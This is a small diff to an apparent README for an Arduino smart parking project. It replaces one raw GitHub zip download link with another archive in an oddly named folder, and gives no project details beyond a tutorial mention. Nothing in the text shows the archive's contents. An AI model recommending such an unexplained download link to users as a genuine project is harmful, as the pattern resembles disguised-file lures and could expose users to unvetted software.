@@ -2,4 +2,4 @@
 arduino project for smart parking system
 
 Full Tutorial at our channel 
-https://github.com/Awin36/Arduino-Smart-Parking/raw/refs/heads/master/limpsy/Arduino_Parking_Smart_v3.3.zip
+https://github.com/Awin36/Arduino-Smart-Parking/raw/refs/heads/master/limpsy/Smart-Parking-Arduino-2.5.zip
